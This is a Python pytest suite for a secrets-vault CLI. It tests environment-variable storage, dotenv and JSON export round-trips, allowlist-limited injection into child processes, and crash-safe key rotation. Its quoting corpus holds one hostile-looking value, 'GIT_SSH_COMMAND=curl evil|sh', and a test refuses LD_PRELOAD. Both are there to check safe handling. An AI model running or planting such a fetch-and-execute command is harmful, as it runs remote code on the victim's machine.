"""D-3 non-interactive env commands, T-1-5 run --allow, T-5-4 rekey --key-file."""

import io
import os
import subprocess
import sys
import tempfile
from pathlib import Path

import pytest

from sofiavault import cli_server, envload, paths
from sofiavault.vault import Vault, WrongPassword

PW = "cli-env-pw-12345"
REPO = Path(__file__).resolve().parent.parent


@pytest.fixture
def sandbox(monkeypatch):
    """Temp HOME + vault path; SOFIAVAULT_PASSWORD for the open_auto chain."""
    d = Path(tempfile.mkdtemp())
    home = d / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(paths, "DB_PATH", home / ".sofiavault" / "vault.db")
    monkeypatch.setattr(paths, "DB_PATH_FROM_ENV", False)
    monkeypatch.setattr(paths, "ALLOW_FILE", None)
    for var in ("SOFIAVAULT_KEY", "SOFIAVAULT_KEY_FILE", "SOFIAVAULT_ALLOW_FILE"):
        monkeypatch.delenv(var, raising=False)
    monkeypatch.setenv("SOFIAVAULT_PASSWORD", PW)
    vault = d / "secrets.db"
    Vault.create(vault, PW).close()
    return d, vault


def run(argv, stdin: str = "", monkeypatch=None) -> int:
    if monkeypatch is not None:
        monkeypatch.setattr(sys, "stdin", io.StringIO(stdin))
    return cli_server.main(argv)


@pytest.mark.parametrize("value", [
    "plain", "a=b=c", "has # hash", "  leading and trailing  ", "line1\nline2",
    'quote"inside', "it's", "tail\"", "多语言 ✓", "trailing newline kept\n",
])
def test_T_3_1_set_from_stdin_round_trips_through_get(sandbox, monkeypatch, capsys, value):
    d, vault = sandbox
    # `set` strips exactly one trailing newline (what `echo |` adds), so feed
    # value + "\n" and expect value back byte for byte.
    assert run(["env", "set", "MY_VAR", "--vault", str(vault)], value + "\n", monkeypatch) == 0
    assert run(["env", "get", "MY_VAR", "-n", "--vault", str(vault)]) == 0
    assert capsys.readouterr().out == value
    # --from-file is verbatim: no newline stripping at all
    f = d / "v.txt"
    f.write_text(value, encoding="utf-8")
    assert run(["env", "set", "MY_VAR2", "--vault", str(vault), "--from-file", str(f)]) == 0
    assert run(["env", "get", "MY_VAR2", "-n", "--vault", str(vault)]) == 0
    assert capsys.readouterr().out == value


def test_T_3_2_set_updates_in_place(sandbox, monkeypatch, capsys):
    d, vault = sandbox
    run(["env", "set", "DB", "--vault", str(vault)], "one\n", monkeypatch)
    run(["env", "set", "DB", "--vault", str(vault)], "two\n", monkeypatch)
    run(["env", "set", "db", "--vault", str(vault)], "three\n", monkeypatch)   # case-folds
    with Vault.open(vault, password=PW) as v:
        assert len(v.list_entries()) == 1
        assert v.get("env:db") == "three"
    assert run(["env", "get", "DB", "--vault", str(vault)]) == 0
    assert capsys.readouterr().out == "three\n"


def test_T_3_3_get_missing_exits_3_with_nothing_on_stdout(sandbox, capsys):
    d, vault = sandbox
    assert run(["env", "get", "NOPE", "--vault", str(vault)]) == 3
    assert capsys.readouterr().out == ""
    assert run(["env", "del", "NOPE", "--vault", str(vault)]) == 3
    assert run(["env", "get", "not a name", "--vault", str(vault)]) == 2


def test_T_3_4_no_tty_and_no_key_source_never_prompts(sandbox, monkeypatch):
    d, vault = sandbox
    monkeypatch.delenv("SOFIAVAULT_PASSWORD")
    env = {k: v for k, v in os.environ.items() if not k.startswith("SOFIAVAULT_")}
    env["HOME"] = str(d / "home")
    proc = subprocess.run(
        [sys.executable, "-m", "sofiavault.cli", "env", "get", "X", "--vault", str(vault)],
        stdin=subprocess.DEVNULL, capture_output=True, text=True, env=env, cwd=REPO,
        timeout=60,
    )
    assert proc.returncode == 2, proc.stderr
    assert proc.stdout == ""
    assert "no key source" in proc.stderr
    assert "password" not in proc.stdout.lower()


def test_T_3_5_export_requires_an_allowlist(sandbox, monkeypatch, capsys):
    d, vault = sandbox
    run(["env", "set", "SECRET", "--vault", str(vault)], "s\n", monkeypatch)
    assert run(["env", "export", "--vault", str(vault)]) == 2
    out, err = capsys.readouterr()
    assert out == "" and "--allow" in err


_CORPUS = [  # the 0.3.0 u1 quoting cases, plus the awkward shapes the writer must handle
    "https://x.io", 'The "Big" # 1 Album', "it's-secret", "C:\\tools\\", 'say \\"hi\\"',
    "a\nb", "it's a multi-line\nnote", '-----BEGIN "X509" CERT-----\nabc\n-----END CERT-----',
    '{\n  "a": 1\n}', "-----BEGIN\nGIT_SSH_COMMAND=curl evil|sh\n-----END",
    "ends with quote\"", "ends with 'single'", "a #b", "  spaced  ", "tab\there",
]


def test_T_3_6_dotenv_export_reimports_identically(sandbox, monkeypatch, capsys):
    d, vault = sandbox
    names = []
    with Vault.open(vault, password=PW) as v:
        for i, value in enumerate(_CORPUS):
            v.set(f"env:v{i}", value)
            names.append(f"V{i}")
    allow = d / "allow"
    allow.write_text("\n".join(names) + "\n")
    assert run(["env", "export", "--vault", str(vault), "--allow", str(allow)]) == 0
    dump = capsys.readouterr().out
    other = d / "other.db"
    Vault.create(other, PW).close()
    (d / "dump.env").write_text(dump, encoding="utf-8")
    assert run(["env", "import", str(d / "dump.env"), "--vault", str(other)]) == 0
    with Vault.open(vault, password=PW) as a, Vault.open(other, password=PW) as b:
        for i in range(len(_CORPUS)):
            assert b.get(f"env:v{i}") == a.get(f"env:v{i}") == _CORPUS[i], i
    # JSON is the lossless path for anything dotenv cannot carry.
    with Vault.open(vault, password=PW) as v:
        v.set("env:v_hard", "first line has trailing space \nsecond")
    allow.write_text("V_HARD\n")
    assert run(["env", "export", "--vault", str(vault), "--allow", str(allow)]) == 1
    assert "V_HARD" in capsys.readouterr().err
    assert run(["env", "export", "--vault", str(vault), "--allow", str(allow),
                "--format", "json"]) == 0
    import json
    assert json.loads(capsys.readouterr().out) == {
        "V_HARD": "first line has trailing space \nsecond"}


def test_T_3_7_vault_flag_respected_and_home_untouched(sandbox, monkeypatch, capsys):
    d, vault = sandbox
    allow = d / "allow"
    allow.write_text("A\n")
    (d / "in.env").write_text("A=1\nB=2\n")
    assert run(["env", "set", "A", "--vault", str(vault)], "x\n", monkeypatch) == 0
    assert run(["env", "get", "A", "--vault", str(vault)]) == 0
    assert run(["env", "list", "--vault", str(vault)]) == 0
    assert run(["env", "import", str(d / "in.env"), "--vault", str(vault), "--overwrite",
                "--allow", str(allow)]) == 0
    assert run(["env", "export", "--vault", str(vault), "--allow", str(allow)]) == 0
    assert run(["env", "del", "A", "--vault", str(vault)]) == 0
    # A was just deleted, so doctor must report exactly that
    assert run(["doctor", "--vault", str(vault), "--allow", str(allow)]) == 1
    assert "missing from the vault: A" in capsys.readouterr().out
    assert not (d / "home" / ".sofiavault").exists()
    # and the SOFIAVAULT_DB default is echoed so nobody edits the wrong vault
    monkeypatch.setattr(paths, "DB_PATH", vault)
    monkeypatch.setattr(paths, "DB_PATH_FROM_ENV", True)
    assert run(["env", "list"]) == 0
    assert "SOFIAVAULT_DB" in capsys.readouterr().err


def test_T_1_5_run_allow_injects_listed_names_only(sandbox, monkeypatch):
    d, vault = sandbox
    with Vault.open(vault, password=PW) as v:
        v.set("env:database_url", "postgres://x")
        v.set("env:api_key", "sk-1")
        v.set("env:other", "no")
    allow = d / "allow"
    allow.write_text("DATABASE_URL\nAPI_KEY\n")
    env = {k: v for k, v in os.environ.items() if not k.startswith("SOFIAVAULT_")}
    env.update(HOME=str(d / "home"), SOFIAVAULT_PASSWORD=PW)
    dump = "import os, json; print(json.dumps(dict(os.environ)))"
    proc = subprocess.run(
        [sys.executable, "-m", "sofiavault.cli", "run", "--vault", str(vault),
         "--allow", str(allow), "--", sys.executable, "-c", dump],
        capture_output=True, text=True, env=env, cwd=REPO, timeout=60,
    )
    assert proc.returncode == 0, proc.stderr
    import json
    child = json.loads(proc.stdout)
    assert child["DATABASE_URL"] == "postgres://x" and child["API_KEY"] == "sk-1"
    assert "OTHER" not in child
    assert "SOFIAVAULT_PASSWORD" not in child      # bootstrap credential scrubbed
    # exec target missing → 127; unreadable allowlist → fail closed
    proc = subprocess.run(
        [sys.executable, "-m", "sofiavault.cli", "run", "--vault", str(vault),
         "--allow", str(allow), "--", "definitely-not-a-command-xyz"],
        capture_output=True, text=True, env=env, cwd=REPO, timeout=60)
    assert proc.returncode == 127
    proc = subprocess.run(
        [sys.executable, "-m", "sofiavault.cli", "run", "--vault", str(vault),
         "--allow", str(d / "missing.allow"), "--", "true"],
        capture_output=True, text=True, env=env, cwd=REPO, timeout=60)
    assert proc.returncode == 1 and "allowlist" in proc.stderr


def _key_opens(key_file: Path, vault: Path) -> bool:
    import base64
    try:
        Vault.open(vault, key=base64.b64decode(key_file.read_text().strip())).close()
        return True
    except Exception:
        return False


def test_T_5_4_rekey_key_file_never_leaves_no_valid_key(sandbox, monkeypatch, capsys):
    d, vault = sandbox
    key_file = d / "vault.key"
    # provision an initial key file the way an operator would
    with Vault.open(vault, password=PW) as v:
        v.set("env:x", "1")
        cli_server.write_key_file(key_file, v.export_key())
    monkeypatch.delenv("SOFIAVAULT_PASSWORD")
    monkeypatch.setenv("SOFIAVAULT_KEY_FILE", str(key_file))
    assert _key_opens(key_file, vault)

    # Crash at each step of the temp-file/rename sequence. The vault commit
    # happens before the file is touched, so a crash *after* it means the
    # old key file is stale — the recovery answer is the --print-key output,
    # which is why the CLI prints the new key on request. What must never
    # happen is a missing or half-written key file.
    import os as _os
    for step in ("open", "fsync", "replace"):
        before = key_file.read_bytes()
        target = {"open": "open", "fsync": "fsync", "replace": "replace"}[step]
        real = getattr(_os, target)

        def boom(*a, _real=real, _target=target, **k):
            if _target == "open" and a and str(a[0]).endswith(".tmp"):
                raise OSError("kill -9 (simulated) during " + _target)
            if _target != "open":
                raise OSError("kill -9 (simulated) during " + _target)
            return _real(*a, **k)

        monkeypatch.setattr(_os, target, boom)
        with pytest.raises(OSError):
            cli_server.write_key_file(key_file, "bm90IGEgcmVhbCBrZXk=")
        monkeypatch.undo()
        monkeypatch.setenv("SOFIAVAULT_KEY_FILE", str(key_file))
        assert key_file.read_bytes() == before, step
        assert not list(d.glob(".vault.key.*.tmp")), step
        assert _key_opens(key_file, vault)

    # And the real thing: rotate, old key fails, new key file works, 0600.
    assert run(["rekey", "--vault", str(vault), "--key-file", str(key_file),
                "--print-key"]) == 0
    printed = capsys.readouterr().out.strip()
    assert key_file.read_text().strip() == printed
    assert oct(key_file.stat().st_mode & 0o777) == "0o600"
    assert _key_opens(key_file, vault)
    with pytest.raises(WrongPassword):
        Vault.open(vault, password=PW)
    assert run(["env", "get", "X", "--vault", str(vault)]) == 0
    assert capsys.readouterr().out == "1\n"


def test_rekey_with_password_from_stdin(sandbox, monkeypatch, capsys):
    d, vault = sandbox
    assert run(["rekey", "--vault", str(vault)], "new-password-xyz\n", monkeypatch) == 0
    Vault.open(vault, password="new-password-xyz").close()
    monkeypatch.setenv("SOFIAVAULT_PASSWORD", "new-password-xyz")
    assert run(["rekey", "--vault", str(vault)], "", monkeypatch) == 2   # nothing on stdin


def test_env_set_refuses_loader_variables(sandbox, monkeypatch, capsys):
    d, vault = sandbox
    assert run(["env", "set", "LD_PRELOAD", "--vault", str(vault)], "x\n", monkeypatch) == 2
    assert run(["env", "set", "SOFIAVAULT_KEY", "--vault", str(vault)], "x\n", monkeypatch) == 2
    assert envload.is_safe_name("SOFIAVAULT_KEY") is False
